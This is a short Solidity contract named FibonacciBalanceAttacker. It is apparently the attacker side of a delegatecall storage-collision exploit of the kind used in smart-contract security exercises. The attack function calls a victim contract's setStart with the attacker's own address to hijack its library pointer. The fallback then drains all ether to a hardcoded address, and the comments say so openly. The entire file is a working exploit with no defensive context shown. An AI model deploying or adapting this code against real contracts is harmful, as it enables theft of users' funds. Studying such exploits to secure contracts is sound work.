pragma solidity ^0.4.22;

contract FibonacciBalanceAttacker {
    uint storageSlot0; // corresponds to fibonacciLibrary
    uint storageSlot1; // corresponds to calculatedFibNumber
    

    // fallback - this will run if a specified function is not found
    function() public {
        address addr = 0x5C6AF7679A6fCd1eb3E12ea500463ec1D90780B3;
        storageSlot1 = 0; // we set calculatedFibNumber to 0, so that if withdraw
        // is called we don't send out any ether.
        addr.transfer(address(this).balance); // we take all the ether
    }

    function attack(address victim) public {
        // we call withdraw to send out ether
        victim.call(bytes4(keccak256("setStart(uint256)")), uint256(address(this)));
    }
 }